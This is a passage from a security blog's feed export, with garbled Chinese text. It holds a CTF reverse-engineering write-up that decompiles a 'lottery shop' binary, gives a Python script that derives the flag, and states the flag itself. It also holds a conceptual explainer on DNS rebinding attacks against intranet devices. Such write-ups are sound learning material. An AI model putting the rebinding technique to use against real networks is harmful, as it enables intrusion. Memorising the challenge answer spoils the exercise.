href="https://obf-io.deobfuscate.io/">Obfuscator.io Deobfuscator (deobfuscate.io)</a></li><li><a href="https://deobfuscate.io/">JavaScript Deobfuscator (deobfuscate.io)</a></li><li><a href="https://www.dejs.vip/">ä¸»é¡µ - DeJs</a></li><li><a href="https://deobfuscate.relative.im/">JavaScript Deobfuscator (relative.im)</a></li></ul><p>å·¥å…·</p><ul><li>v_jstoolsï¼ˆæµè§ˆå™¨æ’ä»¶ï¼Œéœ€é…ç½®ï¼‰ â€“ <a href="https://blog.csdn.net/freeking101/article/details/121668637">ç½‘é¡µ js é€†å‘åˆ†æ ( v_jstools )ã€jshook ( å®‰å“ä¸Šç”¨jså®ç°Hook )-CSDNåšå®¢</a></li></ul><h2 id="lotery-shop"><a href="#lotery-shop" class="headerlink" title="lotery shop"></a>lotery shop</h2><p>æ ¸å¿ƒä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">sub_140017AC0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [rsp+60h] [rbp+0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v3[<span class="number">80</span>]; <span class="comment">// [rsp+68h] [rbp+8h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">80</span>]; <span class="comment">// [rsp+B8h] [rbp+58h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">96</span>]; <span class="comment">// [rsp+108h] [rbp+A8h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">80</span>]; <span class="comment">// [rsp+168h] [rbp+108h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v7[<span class="number">20</span>]; <span class="comment">// [rsp+1B8h] [rbp+158h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v8[<span class="number">20</span>]; <span class="comment">// [rsp+208h] [rbp+1A8h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v9[<span class="number">20</span>]; <span class="comment">// [rsp+258h] [rbp+1F8h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v10[<span class="number">20</span>]; <span class="comment">// [rsp+2A8h] [rbp+248h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v11[<span class="number">76</span>]; <span class="comment">// [rsp+2F8h] [rbp+298h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v12[<span class="number">8</span>]; <span class="comment">// [rsp+344h] [rbp+2E4h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v13[<span class="number">19</span>]; <span class="comment">// [rsp+364h] [rbp+304h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v14[<span class="number">180</span>]; <span class="comment">// [rsp+3B0h] [rbp+350h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v15[<span class="number">148</span>]; <span class="comment">// [rsp+464h] [rbp+404h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+6B4h] [rbp+654h]</span></span><br><span class="line"></span><br><span class="line">  v0 = &amp;v2;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">266</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v0 = <span class="number">-858993460</span>;</span><br><span class="line">    v0 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_140011690(&amp;unk_14002D06A);</span><br><span class="line">  v13[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v13[<span class="number">8</span>] = <span class="number">10</span>;</span><br><span class="line">  j_memset(v14, <span class="number">0</span>, <span class="number">30u</span>i64);</span><br><span class="line">  v15[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  sub_14001117C(v3, <span class="string">&quot;Sloth&#x27;s lottery shop is open!&quot;</span>);</span><br><span class="line">  sub_14001117C(v4, <span class="string">&quot;You&#x27;re our first customer!&quot;</span>);</span><br><span class="line">  sub_1400114CE(v5, <span class="string">&quot;We will give you a free lottery ticket, the number is: &quot;</span>);</span><br><span class="line">  sub_14001117C(v6, <span class="string">&quot;Please enter your choice &#123;1-5&#125;&quot;</span>);</span><br><span class="line">  sub_14001117C(v7, <span class="string">&quot;1.buy a lottery ticket&quot;</span>);</span><br><span class="line">  sub_14001117C(v8, <span class="string">&quot;2.Check to see if you won&quot;</span>);</span><br><span class="line">  sub_14001117C(v9, <span class="string">&quot;3.join us&quot;</span>);</span><br><span class="line">  sub_14001117C(v10, <span class="string">&quot;4.Take a sneak peek at the flag&quot;</span>);</span><br><span class="line">  sub_14001117C(v11, <span class="string">&quot;5.exit&quot;</span>);</span><br><span class="line">  sub_1400110FF(</span><br><span class="line">    (<span class="keyword">int</span>)v3,</span><br><span class="line">    (<span class="keyword">int</span>)v4,</span><br><span class="line">    (<span class="keyword">int</span>)v5,</span><br><span class="line">    (<span class="keyword">int</span>)v6,</span><br><span class="line">    (__int64)v7,</span><br><span class="line">    (__int64)v8,</span><br><span class="line">    (__int64)v9,</span><br><span class="line">    (__int64)v10,</span><br><span class="line">    (__int64)v11,</span><br><span class="line">    (__int64)v13,</span><br><span class="line">    (__int64)v15,</span><br><span class="line">    (__int64)v14);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_14001156E((<span class="keyword">int</span>)v7, (<span class="keyword">int</span>)v8, (<span class="keyword">int</span>)v9, (<span class="keyword">int</span>)v10, v11, v6);</span><br><span class="line">      sub_1400113CA(<span class="string">&quot;%d&quot;</span>, v12);</span><br><span class="line">      v16 = v12[<span class="number">0</span>];</span><br><span class="line">      <span class="keyword">if</span> ( v12[<span class="number">0</span>] != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">      sub_1400111EF(v15, (__int64)v14);</span><br><span class="line">      sub_1400111BD();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> ( v16 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">        sub_140011708(v15, v14, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v13[<span class="number">0</span>]);</span><br><span class="line">        sub_1400111BD();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">        sub_14001149C();</span><br><span class="line">        sub_1400111BD();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">        sub_1400114E7();</span><br><span class="line">        sub_1400111BD();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Welcome again&quot;</span>);</span><br><span class="line">        sub_1400111BD();</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;input error&quot;</span>);</span><br><span class="line">        sub_1400111BD();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¹¶æ²¡æœ‰æœ‰å…³flagçš„ä¿¡æ¯ï¼ŒçœŸæ­£çš„flagåœ¨<code>sub_1400110FF</code>å‡½æ•°ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_140016760</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        __int64 a1,</span></span></span><br><span class="line"><span class="function"><span class="params">        __int64 a2,</span></span></span><br><span class="line"><span class="function"><span class="params">        __int64 a3,</span></span></span><br><span class="line"><span class="function"><span class="params">        __int64 a4,</span></span></span><br><span class="line"><span class="function"><span class="params">        _BYTE *a5,</span></span></span><br><span class="line"><span class="function"><span class="params">        __int64 a6,</span></span></span><br><span class="line"><span class="function"><span class="params">        __int64 a7,</span></span></span><br><span class="line"><span class="function"><span class="params">        __int64 a8,</span></span></span><br><span class="line"><span class="function"><span class="params">        _BYTE *a9,</span></span></span><br><span class="line"><span class="function"><span class="params">        _DWORD *a10,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">int</span> *a11,</span></span></span><br><span class="line"><span class="function"><span class="params">        __int64 a12)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *v14; <span class="comment">// [rsp+1E8h] [rbp+1C8h]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [rsp+264h] [rbp+244h]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+264h] [rbp+244h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+284h] [rbp+264h]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [rsp+2A4h] [rbp+284h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+2C4h] [rbp+2A4h]</span></span><br><span class="line">  __int64 v20; <span class="comment">// [rsp+2E8h] [rbp+2C8h]</span></span><br><span class="line"></span><br><span class="line">  sub_140011690(&amp;unk_14002D06A);</span><br><span class="line">  v14 = (_BYTE *)sub_1400112AD(<span class="number">14</span>i64);</span><br><span class="line">  <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)a1);</span><br><span class="line">  <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)a2);</span><br><span class="line">  v14[<span class="number">9</span>] = *a5;</span><br><span class="line">  v14[<span class="number">2</span>] = v14[<span class="number">9</span>];</span><br><span class="line">  v14[<span class="number">1</span>] = *(_BYTE *)(a1 + <span class="number">10</span>) - <span class="number">12</span>;</span><br><span class="line">  v14[<span class="number">10</span>] = *(_BYTE *)(a3 + <span class="number">5</span>) - <span class="number">56</span>;</span><br><span class="line">  v14[<span class="number">7</span>] = *(_BYTE *)(a6 + <span class="number">15</span>) - <span class="number">10</span>;</span><br><span class="line">  v14[<span class="number">13</span>] = <span class="built_in">toupper</span>((<span class="keyword">char</span>)(*(_BYTE *)(a8 + <span class="number">3</span>) + <span class="number">3</span>));</span><br><span class="line">  v14[<span class="number">3</span>] = *(_BYTE *)(a2 + <span class="number">1</span>) + <span class="number">4</span>;</span><br><span class="line">  v14[<span class="number">11</span>] = <span class="built_in">toupper</span>((<span class="keyword">char</span>)(*(_BYTE *)(a7 + <span class="number">7</span>) - <span class="number">14</span>));</span><br><span class="line">  v14[<span class="number">4</span>] = v14[<span class="number">7</span>];</span><br><span class="line">  *v14 = <span class="built_in">tolower</span>((<span class="keyword">char</span>)(*a9 + <span class="number">31</span>));</span><br><span class="line">  v14[<span class="number">8</span>] = <span class="built_in">toupper</span>(*(<span class="keyword">char</span> *)(a8 + <span class="number">27</span>));</span><br><span class="line">  v14[<span class="number">5</span>] = <span class="built_in">toupper</span>((<span class="keyword">char</span>)(*(_BYTE *)(a4 + <span class="number">13</span>) - <span class="number">16</span>));</span><br><span class="line">  v14[<span class="number">6</span>] = v14[<span class="number">3</span>];</span><br><span class="line">  v14[<span class="number">12</span>] = a5[<span class="number">6</span>] - <span class="number">39</span>;</span><br><span class="line">  v12 = sub_1400180A0(<span class="number">0</span>i64);</span><br><span class="line">  srand(v12);</span><br><span class="line">  v15 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = rand() % <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span> ( i != <span class="number">7</span> || v18 )</span><br><span class="line">    &#123;</span><br><span class="line">      *a10 += v18 * v15;</span><br><span class="line">      v15 *= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      --i;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v16 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">8</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v20 = rand() % <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span> ( j != <span class="number">7</span> || v20 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( j )</span><br><span class="line">        *(_QWORD *)(a12 + <span class="number">8</span>i64 * *a11) += v20 * v16;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        *(_QWORD *)(a12 + <span class="number">8</span>i64 * *a11) = v20;</span><br><span class="line">      v16 *= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      --j;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sub_1400112E9(<span class="string">&quot;%s %d\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)a3, *(_QWORD *)(a12 + <span class="number">8</span>i64 * (*a11)++));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœŸæ­£çš„flagåœ¨v14å˜é‡ä¸­ï¼Œæ˜¯æ ¹æ®å·²æœ‰çš„å˜é‡å˜æ¢å¾—åˆ°çš„</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">v3 = <span class="string">&quot;Sloth&#x27;s lottery shop is open!&quot;</span></span><br><span class="line">v4 = <span class="string">&quot;You&#x27;re our first customer!&quot;</span></span><br><span class="line">v5 = <span class="string">&quot;We will give you a free lottery ticket, the number is: &quot;</span></span><br><span class="line">v6 = <span class="string">&quot;Please enter your choice &#123;1-5&#125;&quot;</span></span><br><span class="line">v7 = <span class="string">&quot;1.buy a lottery ticket&quot;</span></span><br><span class="line">v8 = <span class="string">&quot;2.Check to see if you won&quot;</span></span><br><span class="line">v9 = <span class="string">&quot;3.join us&quot;</span></span><br><span class="line">v10 = <span class="string">&quot;4.Take a sneak peek at the flag&quot;</span></span><br><span class="line">v11 = <span class="string">&quot;5.exit&quot;</span></span><br><span class="line">v13 = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>]</span><br><span class="line">v15 = [<span class="number">0</span>] * <span class="number">10</span></span><br><span class="line">v14 = [<span class="number">0</span>] * <span class="number">10</span></span><br><span class="line"></span><br><span class="line">V14 = [<span class="number">0</span>] * <span class="number">14</span></span><br><span class="line"></span><br><span class="line">V14[<span class="number">9</span>] = v7[<span class="number">0</span>]</span><br><span class="line">V14[<span class="number">2</span>] = V14[<span class="number">9</span>]</span><br><span class="line">V14[<span class="number">1</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v3[<span class="number">10</span>])<span class="number">-12</span>)</span><br><span class="line">V14[<span class="number">10</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v5[<span class="number">5</span>]) - <span class="number">56</span>)</span><br><span class="line">V14[<span class="number">7</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v8[<span class="number">15</span>]) - <span class="number">10</span>)</span><br><span class="line">V14[<span class="number">13</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v10[<span class="number">3</span>]) + <span class="number">3</span>).upper()<span class="comment">#</span></span><br><span class="line">V14[<span class="number">3</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v4[<span class="number">1</span>]) + <span class="number">4</span>)</span><br><span class="line">V14[<span class="number">11</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v9[<span class="number">7</span>])<span class="number">-14</span>).upper()<span class="comment">#</span></span><br><span class="line">V14[<span class="number">4</span>] = (V14[<span class="number">7</span>])</span><br><span class="line">V14[<span class="number">0</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v11[<span class="number">0</span>])+<span class="number">31</span>).lower()<span class="comment">#l</span></span><br><span class="line">V14[<span class="number">8</span>] = (v10[<span class="number">27</span>]).upper()<span class="comment">#</span></span><br><span class="line">V14[<span class="number">5</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v6[<span class="number">13</span>])<span class="number">-16</span>).upper()<span class="comment">#</span></span><br><span class="line">V14[<span class="number">6</span>] = V14[<span class="number">3</span>]</span><br><span class="line">V14[<span class="number">12</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v7[<span class="number">6</span>])<span class="number">-39</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;&#x27;</span>.join(V14))</span><br></pre></td></tr></table></figure><p><code>XSCTF&#123;th1s_Is_F14G:D&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNSé‡ç»‘å®š</title>
      <link href="2022/04/17/dns_rebinding_attack/"/>
      <url>2022/04/17/dns_rebinding_attack/</url>
      
        <content type="html"><![CDATA[<h2 id="DNSé‡ç»‘å®š"><a href="#DNSé‡ç»‘å®š" class="headerlink" title="DNSé‡ç»‘å®š"></a>DNSé‡ç»‘å®š</h2><p>DNSé‡ç»‘å®šæŒ‡çš„æ˜¯åœ¨ç”¨æˆ·è®¿é—®åŸŸåæ—¶æ›´æ”¹åŸŸåæŒ‡å‘çš„IPä»è€Œä»¤ç”¨æˆ·è®¿é—®æŒ‡å®šIPçš„æ”»å‡»æ‰‹æ³•</p><hr><p><strong>DNS</strong>ï¼šç”±äºç½‘ç»œä¼ è¾“éœ€è¦IPåœ°å€ï¼Œæ•…éœ€è¦DNSï¼ˆDomian Name Serverï¼‰ç”¨äºæŸ¥è¯¢ç»™å®šåŸŸåæŒ‡å‘çš„IP</p><p><strong>åŒæºç­–ç•¥</strong>ï¼ˆThe Same-origin Policyï¼‰ï¼š</p><blockquote><p>The same-origin policy restricts which network messages one origin can send to another. For example, the same-origin policy allows inter-origin HTTP requests with GET and POST methods but denies inter-origin PUT and DELETE requests. Additionally, origins can use custom HTTP headers when sending requests to themselves but cannot use custom headers when sending requests to other origins.</p><p>The restrictions on reading information received from other origins is also somewhat subtle. For example, the HTML &lt;script&gt; element can execute content retrieved from foreign origins, which means web sites should not rely on the same-origin policy to protect the confidentiality of information in a format that happens to parse as script (e.g., JavaScript source files, JSON format, JSONP services, or <a href="http://www.thinkfu.com/blog/?p=15">JavaScript/gif polyglots</a>). For all such resources, no loss of security would result (and much flexibility would be gained) from adding the Access-Control-Allow-Origin:* header to all responses.</p></blockquote><p>ä»¥ä¸Šè§£é‡Šæ¥è‡ªäº<a href="https://www.w3.org/Security/wiki/Same_Origin_Policy">Same Origin Policy - Web Security (w3.org)</a></p><p><a href="https://www.helloimg.com/image/RnPgwo"><img src="https://www.helloimg.com/images/2022/04/17/RnPgwo.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/04/17/RnPgwo.png" srcset="data:image/png;base64,666" alt="RnPgwo.png"></a></p><p>ç®€å•æ¥è¯´ï¼Œä¸ºäº†é˜²æ­¢æ·˜å®ç½‘å¸¦ç€ä½ çš„è´¦æˆ·ä¿¡æ¯è®¿é—®äº¬ä¸œï¼Œéœ€è¦åŒæºç­–ç•¥æ¥é™åˆ¶ä¸åŒç½‘ç«™ä¹‹é—´çš„è®¿é—®è§„èŒƒ</p><hr><p>â€‹    å¯ä»¥çœ‹å‡ºåŒæºçš„è¦æ±‚æ˜¯â€œåè®®+ç«¯å£+åŸŸå/ipâ€ï¼Œè€Œå¦‚æœä»¥åŸŸåè®¿é—®ç½‘ç«™ï¼ˆé€šå¸¸çš„åšæ³•ï¼‰æ—¶åŒæºç­–ç•¥å°±å˜æˆäº†â€œåè®®+ç«¯å£+åŸŸåâ€è¿™å°±ç»™äº†DNSé‡ç»‘å®šæ”»å‡»å®ç°çš„å¯èƒ½</p><p>è¦å®ç°DNSé‡ç»‘å®šæ”»å‡»ï¼Œæ”»å‡»è€…éœ€è¦å…·å¤‡ä»¥ä¸‹æ¡ä»¶ï¼š</p><ul>    <li>è¯±ä½¿ç”¨æˆ·ç‚¹å‡»ç»™å®šé“¾æ¥ï¼ˆé’“é±¼é‚®ä»¶ã€é’“é±¼çŸ­ä¿¡ã€ç¤¾å·¥ç­‰ï¼‰</li>    <li>å¯æ§çš„DNSæœåŠ¡å™¨ï¼ˆè‡ªå·±æ­å»ºä¸€ä¸ªæˆ–è€…æŠ¢ä¸€ä¸ªï¼‰</li></ul><p>â€‹    DNSé‡ç»‘å®šæ”»å‡»ä¼šè¯±ä½¿ç”¨æˆ·è®¿é—®ä¸€ä¸ªåŸŸåï¼Œåœ¨ç”¨æˆ·ç¬¬ä¸€æ¬¡è®¿é—®æ—¶ä»¥æ­£å¸¸çš„IPè¿›è¡Œé€šä¿¡ï¼Œå¹¶ä¸”åœ¨è¿”å›çš„DNSæŸ¥è¯¢ç»“æœä¸­å°†TTLè®¾ç½®ä¸º1æˆ–å…¶ä»–æ¯”è¾ƒå°çš„æ•°å­—ï¼Œåœ¨è¯±ä½¿ç”¨æˆ·ä»¥ç‚¹å‡»ç­‰è¡Œä¸ºæ„é€ å¥½æ¶æ„è¯·æ±‚æ—¶ï¼Œæ”»å‡»è€…ä¸€èˆ¬ä¼šä¿®æ”¹DNSæœåŠ¡å™¨ä¸Šè¯¥åŸŸåæŒ‡å‘çš„IPï¼Œä»è€Œå°†æ¶æ„è¯·æ±‚å‘é€è‡³æ”»å‡»è€…æŒ‡å®šçš„IPï¼›</p><blockquote><p>TTLï¼ˆTime To Liveï¼‰æŒ‡çš„æ˜¯dnsæŸ¥è¯¢ç»“æœçš„æœ‰æ•ˆæ—¶é—´ï¼Œé€šè¿‡ä¿®æ”¹TTLä¸ºä¸€ä¸ªè¾ƒå°çš„å€¼ä»è€Œå®ç°å—å®³è€…ä¸DNSæœåŠ¡å™¨çš„é¢‘ç¹é€šä¿¡ï¼Œä»è€Œä¿è¯åœ¨ä¿®æ”¹åŸŸåæŒ‡å‘çš„IPæ—¶èƒ½ç«‹å³ç”Ÿæ•ˆ</p></blockquote><hr><p>â€‹    æ˜“å—æ”»å‡»çš„è®¾å¤‡ï¼šä¸€èˆ¬æ˜¯ä½äºå†…ç½‘çš„æ™ºèƒ½å®¶å±…è®¾å¤‡ï¼Œç”±äºæ”»å‡»è€…æ— æ³•ä»å¤–ç½‘è®¿é—®å—å®³è€…çš„å†…ç½‘ï¼Œæ•…ä»¥æ­¤ç§æ”»å‡»ä¼ªé€ èº«ä»½è®¿é—®å†…ç½‘ï¼ˆSSRFï¼‰ï¼›æ¯”å¦‚æ’æ¸©å™¨ï¼Œè‹¥åœ¨ä¸€ä¸ªåªæœ‰è€äººçš„åœºæ‰€ä¸­ï¼Œè¿™ç§æ”»å‡»å¾€å¾€æ˜¯è‡´å‘½çš„</p><blockquote><p>quote<br><a href="https://www.w3.org/Security/wiki/Same_Origin_Policy">Same Origin Policy - Web Security (w3.org)</a><br><a href="https://zhuanlan.zhihu.com/p/45583472">åˆ©ç”¨DNSé‡ç»‘å®šæ”»å‡»ä¸“ç”¨ç½‘ç»œ - çŸ¥ä¹ (zhihu.com)</a><br><a href="https://xz.aliyun.com/t/7495">ä»0åˆ°1è®¤è¯†DNSé‡ç»‘å®šæ”»å‡» - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Internet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GoogleHacking</title>
      <link href="2022/04/09/google_hacking/"/>
      <url>2022/04/09/google_hacking/</url>
      
